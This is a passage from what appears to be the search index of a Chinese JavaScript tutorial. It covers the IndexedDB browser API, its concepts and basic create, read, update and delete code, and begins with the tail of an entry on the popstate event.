\u5bf9\u8c61\u3002 \u8fd9\u4e2a state \u5bf9\u8c61\u4e5f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 history \u5bf9\u8c61\u8bfb\u53d6\u3002 1 var currentState = history . state ; \u6ce8\u610f\uff0c\u9875\u9762\u7b2c\u4e00\u6b21\u52a0\u8f7d\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u4e0d\u4f1a\u89e6\u53d1 popstate \u4e8b\u4ef6\u3002","title":"popstate \u4e8b\u4ef6"},{"location":"bom/indexeddb/","text":"IndexedDB API \u00b6 \u6982\u8ff0 \u00b6 \u968f\u7740\u6d4f\u89c8\u5668\u7684\u529f\u80fd\u4e0d\u65ad\u589e\u5f3a\uff0c\u8d8a\u6765\u8d8a\u591a\u7684\u7f51\u7ad9\u5f00\u59cb\u8003\u8651\uff0c\u5c06\u5927\u91cf\u6570\u636e\u50a8\u5b58\u5728\u5ba2\u6237\u7aef\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u4ece\u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\uff0c\u76f4\u63a5\u4ece\u672c\u5730\u83b7\u53d6\u6570\u636e\u3002 \u73b0\u6709\u7684\u6d4f\u89c8\u5668\u6570\u636e\u50a8\u5b58\u65b9\u6848\uff0c\u90fd\u4e0d\u9002\u5408\u50a8\u5b58\u5927\u91cf\u6570\u636e\uff1aCookie \u7684\u5927\u5c0f\u4e0d\u8d85\u8fc7 4KB\uff0c\u4e14\u6bcf\u6b21\u8bf7\u6c42\u90fd\u4f1a\u53d1\u9001\u56de\u670d\u52a1\u5668\uff1bLocalStorage \u5728 2.5MB \u5230 10MB \u4e4b\u95f4\uff08\u5404\u5bb6\u6d4f\u89c8\u5668\u4e0d\u540c\uff09\uff0c\u800c\u4e14\u4e0d\u63d0\u4f9b\u641c\u7d22\u529f\u80fd\uff0c\u4e0d\u80fd\u5efa\u7acb\u81ea\u5b9a\u4e49\u7684\u7d22\u5f15\u3002\u6240\u4ee5\uff0c\u9700\u8981\u4e00\u79cd\u65b0\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u8fd9\u5c31\u662f IndexedDB \u8bde\u751f\u7684\u80cc\u666f\u3002 \u901a\u4fd7\u5730\u8bf4\uff0cIndexedDB \u5c31\u662f\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u672c\u5730\u6570\u636e\u5e93\uff0c\u5b83\u53ef\u4ee5\u88ab\u7f51\u9875\u811a\u672c\u521b\u5efa\u548c\u64cd\u4f5c\u3002IndexedDB \u5141\u8bb8\u50a8\u5b58\u5927\u91cf\u6570\u636e\uff0c\u63d0\u4f9b\u67e5\u627e\u63a5\u53e3\uff0c\u8fd8\u80fd\u5efa\u7acb\u7d22\u5f15\u3002\u8fd9\u4e9b\u90fd\u662f LocalStorage \u6240\u4e0d\u5177\u5907\u7684\u3002\u5c31\u6570\u636e\u5e93\u7c7b\u578b\u800c\u8a00\uff0cIndexedDB \u4e0d\u5c5e\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff08\u4e0d\u652f\u6301 SQL \u67e5\u8be2\u8bed\u53e5\uff09\uff0c\u66f4\u63a5\u8fd1 NoSQL \u6570\u636e\u5e93\u3002 IndexedDB \u5177\u6709\u4ee5\u4e0b\u7279\u70b9\u3002 \uff081\uff09\u952e\u503c\u5bf9\u50a8\u5b58\u3002 IndexedDB \u5185\u90e8\u91c7\u7528\u5bf9\u8c61\u4ed3\u5e93\uff08object store\uff09\u5b58\u653e\u6570\u636e\u3002\u6240\u6709\u7c7b\u578b\u7684\u6570\u636e\u90fd\u53ef\u4ee5\u76f4\u63a5\u5b58\u5165\uff0c\u5305\u62ec JavaScript \u5bf9\u8c61\u3002\u5bf9\u8c61\u4ed3\u5e93\u4e2d\uff0c\u6570\u636e\u4ee5\u201c\u952e\u503c\u5bf9\u201d\u7684\u5f62\u5f0f\u4fdd\u5b58\uff0c\u6bcf\u4e00\u4e2a\u6570\u636e\u8bb0\u5f55\u90fd\u6709\u5bf9\u5e94\u7684\u4e3b\u952e\uff0c\u4e3b\u952e\u662f\u72ec\u4e00\u65e0\u4e8c\u7684\uff0c\u4e0d\u80fd\u6709\u91cd\u590d\uff0c\u5426\u5219\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 \uff082\uff09\u5f02\u6b65\u3002 IndexedDB \u64cd\u4f5c\u65f6\u4e0d\u4f1a\u9501\u6b7b\u6d4f\u89c8\u5668\uff0c\u7528\u6237\u4f9d\u7136\u53ef\u4ee5\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\uff0c\u8fd9\u4e0e LocalStorage \u5f62\u6210\u5bf9\u6bd4\uff0c\u540e\u8005\u7684\u64cd\u4f5c\u662f\u540c\u6b65\u7684\u3002\u5f02\u6b65\u8bbe\u8ba1\u662f\u4e3a\u4e86\u9632\u6b62\u5927\u91cf\u6570\u636e\u7684\u8bfb\u5199\uff0c\u62d6\u6162\u7f51\u9875\u7684\u8868\u73b0\u3002 \uff083\uff09\u652f\u6301\u4e8b\u52a1\u3002 IndexedDB \u652f\u6301\u4e8b\u52a1\uff08transaction\uff09\uff0c\u8fd9\u610f\u5473\u7740\u4e00\u7cfb\u5217\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u4e2d\uff0c\u53ea\u8981\u6709\u4e00\u6b65\u5931\u8d25\uff0c\u6574\u4e2a\u4e8b\u52a1\u5c31\u90fd\u53d6\u6d88\uff0c\u6570\u636e\u5e93\u56de\u6eda\u5230\u4e8b\u52a1\u53d1\u751f\u4e4b\u524d\u7684\u72b6\u6001\uff0c\u4e0d\u5b58\u5728\u53ea\u6539\u5199\u4e00\u90e8\u5206\u6570\u636e\u7684\u60c5\u51b5\u3002 \uff084\uff09\u540c\u6e90\u9650\u5236\u3002 IndexedDB \u53d7\u5230\u540c\u6e90\u9650\u5236\uff0c\u6bcf\u4e00\u4e2a\u6570\u636e\u5e93\u5bf9\u5e94\u521b\u5efa\u5b83\u7684\u57df\u540d\u3002\u7f51\u9875\u53ea\u80fd\u8bbf\u95ee\u81ea\u8eab\u57df\u540d\u4e0b\u7684\u6570\u636e\u5e93\uff0c\u800c\u4e0d\u80fd\u8bbf\u95ee\u8de8\u57df\u7684\u6570\u636e\u5e93\u3002 \uff085\uff09\u50a8\u5b58\u7a7a\u95f4\u5927\u3002 IndexedDB \u7684\u50a8\u5b58\u7a7a\u95f4\u6bd4 LocalStorage \u5927\u5f97\u591a\uff0c\u4e00\u822c\u6765\u8bf4\u4e0d\u5c11\u4e8e 250MB\uff0c\u751a\u81f3\u6ca1\u6709\u4e0a\u9650\u3002 \uff086\uff09\u652f\u6301\u4e8c\u8fdb\u5236\u50a8\u5b58\u3002 IndexedDB \u4e0d\u4ec5\u53ef\u4ee5\u50a8\u5b58\u5b57\u7b26\u4e32\uff0c\u8fd8\u53ef\u4ee5\u50a8\u5b58\u4e8c\u8fdb\u5236\u6570\u636e\uff08ArrayBuffer \u5bf9\u8c61\u548c Blob \u5bf9\u8c61\uff09\u3002 \u57fa\u672c\u6982\u5ff5 \u00b6 IndexedDB \u662f\u4e00\u4e2a\u6bd4\u8f83\u590d\u6742\u7684 API\uff0c\u6d89\u53ca\u4e0d\u5c11\u6982\u5ff5\u3002\u5b83\u628a\u4e0d\u540c\u7684\u5b9e\u4f53\uff0c\u62bd\u8c61\u6210\u4e00\u4e2a\u4e2a\u5bf9\u8c61\u63a5\u53e3\u3002\u5b66\u4e60\u8fd9\u4e2a API\uff0c\u5c31\u662f\u5b66\u4e60\u5b83\u7684\u5404\u79cd\u5bf9\u8c61\u63a5\u53e3\u3002 \u6570\u636e\u5e93\uff1aIDBDatabase \u5bf9\u8c61 \u5bf9\u8c61\u4ed3\u5e93\uff1aIDBObjectStore \u5bf9\u8c61 \u7d22\u5f15\uff1a IDBIndex \u5bf9\u8c61 \u4e8b\u52a1\uff1a IDBTransaction \u5bf9\u8c61 \u64cd\u4f5c\u8bf7\u6c42\uff1aIDBRequest \u5bf9\u8c61 \u6307\u9488\uff1a IDBCursor \u5bf9\u8c61 \u4e3b\u952e\u96c6\u5408\uff1aIDBKeyRange \u5bf9\u8c61 \u4e0b\u9762\u662f\u4e00\u4e9b\u4e3b\u8981\u7684\u6982\u5ff5\u3002 \uff081\uff09\u6570\u636e\u5e93 \u6570\u636e\u5e93\u662f\u4e00\u7cfb\u5217\u76f8\u5173\u6570\u636e\u7684\u5bb9\u5668\u3002\u6bcf\u4e2a\u57df\u540d\uff08\u4e25\u683c\u7684\u8bf4\uff0c\u662f\u534f\u8bae + \u57df\u540d + \u7aef\u53e3\uff09\u90fd\u53ef\u4ee5\u65b0\u5efa\u4efb\u610f\u591a\u4e2a\u6570\u636e\u5e93\u3002 IndexedDB \u6570\u636e\u5e93\u6709\u7248\u672c\u7684\u6982\u5ff5\u3002\u540c\u4e00\u4e2a\u65f6\u523b\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u7248\u672c\u7684\u6570\u636e\u5e93\u5b58\u5728\u3002\u5982\u679c\u8981\u4fee\u6539\u6570\u636e\u5e93\u7ed3\u6784\uff08\u65b0\u589e\u6216\u5220\u9664\u8868\u3001\u7d22\u5f15\u6216\u8005\u4e3b\u952e\uff09\uff0c\u53ea\u80fd\u901a\u8fc7\u5347\u7ea7\u6570\u636e\u5e93\u7248\u672c\u5b8c\u6210\u3002 \uff082\uff09\u5bf9\u8c61\u4ed3\u5e93 \u6bcf\u4e2a\u6570\u636e\u5e93\u5305\u542b\u82e5\u5e72\u4e2a\u5bf9\u8c61\u4ed3\u5e93\uff08object store\uff09\u3002\u5b83\u7c7b\u4f3c\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u8868\u683c\u3002 \uff083\uff09\u6570\u636e\u8bb0\u5f55 \u5bf9\u8c61\u4ed3\u5e93\u4fdd\u5b58\u7684\u662f\u6570\u636e\u8bb0\u5f55\u3002\u6bcf\u6761\u8bb0\u5f55\u7c7b\u4f3c\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u884c\uff0c\u4f46\u662f\u53ea\u6709\u4e3b\u952e\u548c\u6570\u636e\u4f53\u4e24\u90e8\u5206\u3002\u4e3b\u952e\u7528\u6765\u5efa\u7acb\u9ed8\u8ba4\u7684\u7d22\u5f15\uff0c\u5fc5\u987b\u662f\u4e0d\u540c\u7684\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u4e3b\u952e\u53ef\u4ee5\u662f\u6570\u636e\u8bb0\u5f55\u91cc\u9762\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e3a\u4e00\u4e2a\u9012\u589e\u7684\u6574\u6570\u7f16\u53f7\u3002 1 { id : 1 , text : 'foo' } \u4e0a\u9762\u7684\u5bf9\u8c61\u4e2d\uff0c id \u5c5e\u6027\u53ef\u4ee5\u5f53\u4f5c\u4e3b\u952e\u3002 \u6570\u636e\u4f53\u53ef\u4ee5\u662f\u4efb\u610f\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u9650\u4e8e\u5bf9\u8c61\u3002 \uff084\uff09\u7d22\u5f15 \u4e3a\u4e86\u52a0\u901f\u6570\u636e\u7684\u68c0\u7d22\uff0c\u53ef\u4ee5\u5728\u5bf9\u8c61\u4ed3\u5e93\u91cc\u9762\uff0c\u4e3a\u4e0d\u540c\u7684\u5c5e\u6027\u5efa\u7acb\u7d22\u5f15\u3002 \uff085\uff09\u4e8b\u52a1 \u6570\u636e\u8bb0\u5f55\u7684\u8bfb\u5199\u548c\u5220\u6539\uff0c\u90fd\u8981\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210\u3002\u4e8b\u52a1\u5bf9\u8c61\u63d0\u4f9b error \u3001 abort \u548c complete \u4e09\u4e2a\u4e8b\u4ef6\uff0c\u7528\u6765\u76d1\u542c\u64cd\u4f5c\u7ed3\u679c\u3002 \u64cd\u4f5c\u6d41\u7a0b \u00b6 IndexedDB \u6570\u636e\u5e93\u7684\u5404\u79cd\u64cd\u4f5c\uff0c\u4e00\u822c\u662f\u6309\u7167\u4e0b\u9762\u7684\u6d41\u7a0b\u8fdb\u884c\u7684\u3002\u8fd9\u4e2a\u90e8\u5206\u53ea\u7ed9\u51fa\u7b80\u5355\u7684\u4ee3\u7801\u793a\u4f8b\uff0c\u7528\u4e8e\u5feb\u901f\u4e0a\u624b\uff0c\u8be6\u7ec6\u7684\u5404\u4e2a\u5bf9\u8c61\u7684 API \u653e\u5728\u540e\u6587\u4ecb\u7ecd\u3002 \u6253\u5f00\u6570\u636e\u5e93 \u00b6 \u4f7f\u7528 IndexedDB \u7684\u7b2c\u4e00\u6b65\u662f\u6253\u5f00\u6570\u636e\u5e93\uff0c\u4f7f\u7528 indexedDB.open() \u65b9\u6cd5\u3002 1 var request = window . indexedDB . open ( databaseName , version ); \u8fd9\u4e2a\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6570\u636e\u5e93\u7684\u540d\u5b57\u3002\u5982\u679c\u6307\u5b9a\u7684\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u65b0\u5efa\u6570\u636e\u5e93\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6574\u6570\uff0c\u8868\u793a\u6570\u636e\u5e93\u7684\u7248\u672c\u3002\u5982\u679c\u7701\u7565\uff0c\u6253\u5f00\u5df2\u6709\u6570\u636e\u5e93\u65f6\uff0c\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7248\u672c\uff1b\u65b0\u5efa\u6570\u636e\u5e93\u65f6\uff0c\u9ed8\u8ba4\u4e3a 1 \u3002 indexedDB.open() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8fd9\u4e2a\u5bf9\u8c61\u901a\u8fc7\u4e09\u79cd\u4e8b\u4ef6 error \u3001 success \u3001 upgradeneeded \uff0c\u5904\u7406\u6253\u5f00\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u7ed3\u679c\u3002 \uff081\uff09error \u4e8b\u4ef6 error \u4e8b\u4ef6\u8868\u793a\u6253\u5f00\u6570\u636e\u5e93\u5931\u8d25\u3002 1 2 3 request . onerror = function ( event ) { console . log ( '\u6570\u636e\u5e93\u6253\u5f00\u62a5\u9519' ); }; \uff082\uff09success \u4e8b\u4ef6 success \u4e8b\u4ef6\u8868\u793a\u6210\u529f\u6253\u5f00\u6570\u636e\u5e93\u3002 1 2 3 4 5 6 var db ; request . onsuccess = function ( event ) { db = request . result ; console . log ( '\u6570\u636e\u5e93\u6253\u5f00\u6210\u529f' ); }; \u8fd9\u65f6\uff0c\u901a\u8fc7 request \u5bf9\u8c61\u7684 result \u5c5e\u6027\u62ff\u5230\u6570\u636e\u5e93\u5bf9\u8c61\u3002 \uff083\uff09upgradeneeded \u4e8b\u4ef6 \u5982\u679c\u6307\u5b9a\u7684\u7248\u672c\u53f7\uff0c\u5927\u4e8e\u6570\u636e\u5e93\u7684\u5b9e\u9645\u7248\u672c\u53f7\uff0c\u5c31\u4f1a\u53d1\u751f\u6570\u636e\u5e93\u5347\u7ea7\u4e8b\u4ef6 upgradeneeded \u3002 1 2 3 4 5 var db ; request . onupgradeneeded = function ( event ) { db = event . target . result ; } \u8fd9\u65f6\u901a\u8fc7\u4e8b\u4ef6\u5bf9\u8c61\u7684 target.result \u5c5e\u6027\uff0c\u62ff\u5230\u6570\u636e\u5e93\u5b9e\u4f8b\u3002 \u65b0\u5efa\u6570\u636e\u5e93 \u00b6 \u65b0\u5efa\u6570\u636e\u5e93\u4e0e\u6253\u5f00\u6570\u636e\u5e93\u662f\u540c\u4e00\u4e2a\u64cd\u4f5c\u3002\u5982\u679c\u6307\u5b9a\u7684\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u65b0\u5efa\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u540e\u7eed\u7684\u64cd\u4f5c\u4e3b\u8981\u5728 upgradeneeded \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\u5b8c\u6210\uff0c\u56e0\u4e3a\u8fd9\u65f6\u7248\u672c\u4ece\u65e0\u5230\u6709\uff0c\u6240\u4ee5\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u901a\u5e38\uff0c\u65b0\u5efa\u6570\u636e\u5e93\u4ee5\u540e\uff0c\u7b2c\u4e00\u4ef6\u4e8b\u662f\u65b0\u5efa\u5bf9\u8c61\u4ed3\u5e93\uff08\u5373\u65b0\u5efa\u8868\uff09\u3002 1 2 3 4 request . onupgradeneeded = function ( event ) { db = event . target . result ; var objectStore = db . createObjectStore ( 'person' , { keyPath : 'id' }); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u636e\u5e93\u65b0\u5efa\u6210\u529f\u4ee5\u540e\uff0c\u65b0\u589e\u4e00\u5f20\u53eb\u505a person \u7684\u8868\u683c\uff0c\u4e3b\u952e\u662f id \u3002 \u66f4\u597d\u7684\u5199\u6cd5\u662f\u5148\u5224\u65ad\u4e00\u4e0b\uff0c\u8fd9\u5f20\u8868\u683c\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u518d\u65b0\u5efa\u3002 1 2 3 4 5 6 7 request . onupgradeneeded = function ( event ) { db = event . target . result ; var objectStore ; if ( ! db . objectStoreNames . contains ( 'person' )) { objectStore = db . createObjectStore ( 'person' , { keyPath : 'id' }); } } \u4e3b\u952e\uff08key\uff09\u662f\u9ed8\u8ba4\u5efa\u7acb\u7d22\u5f15\u7684\u5c5e\u6027\u3002\u6bd4\u5982\uff0c\u6570\u636e\u8bb0\u5f55\u662f { id: 1, name: '\u5f20\u4e09' } \uff0c\u90a3\u4e48 id \u5c5e\u6027\u53ef\u4ee5\u4f5c\u4e3a\u4e3b\u952e\u3002\u4e3b\u952e\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e3a\u4e0b\u4e00\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u6bd4\u5982 { foo: { bar: 'baz' } } \u7684 foo.bar \u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e3a\u4e3b\u952e\u3002 \u5982\u679c\u6570\u636e\u8bb0\u5f55\u91cc\u9762\u6ca1\u6709\u5408\u9002\u4f5c\u4e3a\u4e3b\u952e\u7684\u5c5e\u6027\uff0c\u90a3\u4e48\u53ef\u4ee5\u8ba9 IndexedDB \u81ea\u52a8\u751f\u6210\u4e3b\u952e\u3002 1 2 3 4 var objectStore = db . createObjectStore ( 'person' , { autoIncrement : true } ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6307\u5b9a\u4e3b\u952e\u4e3a\u4e00\u4e2a\u9012\u589e\u7684\u6574\u6570\u3002 \u65b0\u5efa\u5bf9\u8c61\u4ed3\u5e93\u4ee5\u540e\uff0c\u4e0b\u4e00\u6b65\u53ef\u4ee5\u65b0\u5efa\u7d22\u5f15\u3002 1 2 3 4 5 6 request . onupgradeneeded = function ( event ) { db = event . target . result ; var objectStore = db . createObjectStore ( 'person' , { keyPath : 'id' }); objectStore . createIndex ( 'name' , 'name' , { unique : false }); objectStore . createIndex ( 'email' , 'email' , { unique : true }); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c IDBObject.createIndex() \u7684\u4e09\u4e2a\u53c2\u6570\u5206\u522b\u4e3a\u7d22\u5f15\u540d\u79f0\u3001\u7d22\u5f15\u6240\u5728\u7684\u5c5e\u6027\u3001\u914d\u7f6e\u5bf9\u8c61\uff08\u8bf4\u660e\u8be5\u5c5e\u6027\u662f\u5426\u5305\u542b\u91cd\u590d\u7684\u503c\uff09\u3002 \u65b0\u589e\u6570\u636e \u00b6 \u65b0\u589e\u6570\u636e\u6307\u7684\u662f\u5411\u5bf9\u8c61\u4ed3\u5e93\u5199\u5165\u6570\u636e\u8bb0\u5f55\u3002\u8fd9\u9700\u8981\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function add () { var request = db . transaction ([ 'person' ], 'readwrite' ) . objectStore ( 'person' ) . add ({ id : 1 , name : '\u5f20\u4e09' , age : 24 , email : 'zhangsan@example.com' }); request . onsuccess = function ( event ) { console . log ( '\u6570\u636e\u5199\u5165\u6210\u529f' ); }; request . onerror = function ( event ) { console . log ( '\u6570\u636e\u5199\u5165\u5931\u8d25' ); } } add (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5199\u5165\u6570\u636e\u9700\u8981\u65b0\u5efa\u4e00\u4e2a\u4e8b\u52a1\u3002\u65b0\u5efa\u65f6\u5fc5\u987b\u6307\u5b9a\u8868\u683c\u540d\u79f0\u548c\u64cd\u4f5c\u6a21\u5f0f\uff08\u201c\u53ea\u8bfb\u201d\u6216\u201c\u8bfb\u5199\u201d\uff09\u3002\u65b0\u5efa\u4e8b\u52a1\u4ee5\u540e\uff0c\u901a\u8fc7 IDBTransaction.objectStore(name) \u65b9\u6cd5\uff0c\u62ff\u5230 IDBObjectStore \u5bf9\u8c61\uff0c\u518d\u901a\u8fc7\u8868\u683c\u5bf9\u8c61\u7684 add() \u65b9\u6cd5\uff0c\u5411\u8868\u683c\u5199\u5165\u4e00\u6761\u8bb0\u5f55\u3002 \u5199\u5165\u64cd\u4f5c\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u901a\u8fc7\u76d1\u542c\u8fde\u63a5\u5bf9\u8c61\u7684 success \u4e8b\u4ef6\u548c error \u4e8b\u4ef6\uff0c\u4e86\u89e3\u662f\u5426\u5199\u5165\u6210\u529f\u3002 \u8bfb\u53d6\u6570\u636e \u00b6 \u8bfb\u53d6\u6570\u636e\u4e5f\u662f\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function read () { var transaction = db . transaction ([ 'person' ]); var objectStore = transaction . objectStore ( 'person' ); var request = objectStore . get ( 1 ); request . onerror = function ( event ) { console . log ( '\u4e8b\u52a1\u5931\u8d25' ); }; request . onsuccess = function ( event ) { if ( request . result ) { console . log ( 'Name: ' + request . result . name ); console . log ( 'Age: ' + request . result . age ); console . log ( 'Email: ' + request . result . email ); } else { console . log ( '\u672a\u83b7\u5f97\u6570\u636e\u8bb0\u5f55' ); } }; } read (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c objectStore.get() \u65b9\u6cd5\u7528\u4e8e\u8bfb\u53d6\u6570\u636e\uff0c\u53c2\u6570\u662f\u4e3b\u952e\u7684\u503c\u3002 \u904d\u5386\u6570\u636e \u00b6 \u904d\u5386\u6570\u636e\u8868\u683c\u7684\u6240\u6709\u8bb0\u5f55\uff0c\u8981\u4f7f\u7528\u6307\u9488\u5bf9\u8c61 IDBCursor\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function readAll () { var objectStore = db . transaction ( 'person' ). objectStore ( 'person' ); objectStore . openCursor (). onsuccess = function ( event ) { var cursor = event . target . result ; if ( cursor ) { console . log ( 'Id: ' + cursor . key ); console . log ( 'Name: ' + cursor . value . name ); console . log ( 'Age: ' + cursor . value . age ); console . log ( 'Email: ' + cursor . value . email ); cursor . continue (); } else { console . log ( '\u6ca1\u6709\u66f4\u591a\u6570\u636e\u4e86\uff01' ); } }; } readAll (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u65b0\u5efa\u6307\u9488\u5bf9\u8c61\u7684 openCursor() \u65b9\u6cd5\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u6240\u4ee5\u8981\u76d1\u542c success \u4e8b\u4ef6\u3002 \u66f4\u65b0\u6570\u636e \u00b6 \u66f4\u65b0\u6570\u636e\u8981\u4f7f\u7528 IDBObject.put() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function update () { var request = db . transaction ([ 'person' ], 'readwrite' ) . objectStore ( 'person' ) . put ({ id : 1 , name : '\u674e\u56db' , age : 35 , email : 'lisi@example.com' }); request . onsuccess = function ( event ) { console . log ( '\u6570\u636e\u66f4\u65b0\u6210\u529f' ); }; request . onerror = function ( event ) { console . log ( '\u6570\u636e\u66f4\u65b0\u5931\u8d25' ); } } update (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c put() \u65b9\u6cd5\u81ea\u52a8\u66f4\u65b0\u4e86\u4e3b\u952e\u4e3a 1 \u7684\u8bb0\u5f55\u3002 \u5220\u9664\u6570\u636e \u00b6 IDBObjectStore.delete() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u8bb0\u5f55\u3002 1 2 3 4 5 6 7 8 9 10 11 function remove () { var request = db . transaction ([ 'person' ], 'readwrite' ) . objectStore ( 'person' ) . delete ( 1 ); request . onsuccess = function ( event ) { console . log ( '\u6570\u636e\u5220\u9664\u6210\u529f' ); }; } remove (); \u4f7f\u7528\u7d22\u5f15 \u00b6 \u7d22\u5f15\u7684\u610f\u4e49\u5728\u4e8e\uff0c\u53ef\u4ee5\u8ba9\u4f60\u641c\u7d22\u4efb\u610f\u5b57\u6bb5\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ece\u4efb\u610f\u5b57\u6bb5\u62ff\u5230\u6570\u636e\u8bb0\u5f55\u3002\u5982\u679c\u4e0d\u5efa\u7acb\u7d22\u5f15\uff0c\u9ed8\u8ba4\u53ea\u80fd\u641c\u7d22\u4e3b\u952e\uff08\u5373\u4ece\u4e3b\u952e\u53d6\u503c\uff09\u3002 \u5047\u5b9a\u65b0\u5efa\u8868\u683c\u7684\u65f6\u5019\uff0c\u5bf9 name \u5b57\u6bb5\u5efa\u7acb\u4e86\u7d22\u5f15\u3002 1 objectStore . createIndex ( 'name' , 'name' , { unique : false }); \u73b0\u5728\uff0c\u5c31\u53ef\u4ee5\u4ece name \u627e\u5230\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var transaction = db . transaction ([ 'person' ], 'readonly' ); var store = transaction . objectStore ( 'person' ); var index = store . index ( 'name' ); var request = index . get ( '\u674e\u56db' ); request . onsuccess = function ( e ) { var result = e . target . result ; if ( result ) { // ... } else { // ... } } indexedDB \u5bf9\u8c61 \u00b6 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b indexedDB \u5bf9\u8c61\uff0c\u4f5c\u4e3a\u5f00\u53d1\u8005\u7684\u64cd\u4f5c\u63a5\u53e3\u3002 indexedDB.open() \u00b6 indexedDB.open() \u65b9\u6cd5\u7528\u4e8e\u6253\u5f00\u6570\u636e\u5e93\u3002\u8fd9\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u4f46\u662f\u4f1a\u7acb\u523b\u8fd4\u56de\u4e00\u4e2a IDBOpenDBRequest \u5bf9\u8c61\u3002 1 var openRequest = window . indexedDB . open ( 'test' , 1 ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u6253\u5f00\u4e00\u4e2a\u540d\u4e3a test \u3001\u7248\u672c\u4e3a 1 \u7684\u6570\u636e\u5e93\u3002\u5982\u679c\u8be5\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u65b0\u5efa\u8be5\u6570\u636e\u5e93\u3002 open() \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6570\u636e\u5e93\u540d\u79f0\uff0c\u683c\u5f0f\u4e3a\u5b57\u7b26\u4e32\uff0c\u4e0d\u53ef\u7701\u7565\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6570\u636e\u5e93\u7248\u672c\uff0c\u662f\u4e00\u4e2a\u5927\u4e8e 0 \u7684\u6b63\u6574\u6570\uff08 0 \u5c06\u62a5\u9519\uff09\uff0c\u5982\u679c\u8be5\u53c2\u6570\u5927\u4e8e\u5f53\u524d\u7248\u672c\uff0c\u4f1a\u89e6\u53d1\u6570\u636e\u5e93\u5347\u7ea7\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u7701\u7565\uff0c\u5982\u679c\u6570\u636e\u5e93\u5df2\u5b58\u5728\uff0c\u5c06\u6253\u5f00\u5f53\u524d\u7248\u672c\u7684\u6570\u636e\u5e93\uff1b\u5982\u679c\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c06\u521b\u5efa\u8be5\u7248\u672c\u7684\u6570\u636e\u5e93\uff0c\u9ed8\u8ba4\u7248\u672c\u4e3a 1 \u3002 \u6253\u5f00\u6570\u636e\u5e93\u662f\u5f02\u6b65\u64cd\u4f5c\uff0c\u901a\u8fc7\u5404\u79cd\u4e8b\u4ef6\u901a\u77e5\u5ba2\u6237\u7aef\u3002\u4e0b\u9762\u662f\u6709\u53ef\u80fd\u89e6\u53d1\u76844\u79cd\u4e8b\u4ef6\u3002 success \uff1a\u6253\u5f00\u6210\u529f\u3002 error \uff1a\u6253\u5f00\u5931\u8d25\u3002 upgradeneeded \uff1a\u7b2c\u4e00\u6b21\u6253\u5f00\u8be5\u6570\u636e\u5e93\uff0c\u6216\u8005\u6570\u636e\u5e93\u7248\u672c\u53d1\u751f\u53d8\u5316\u3002 blocked 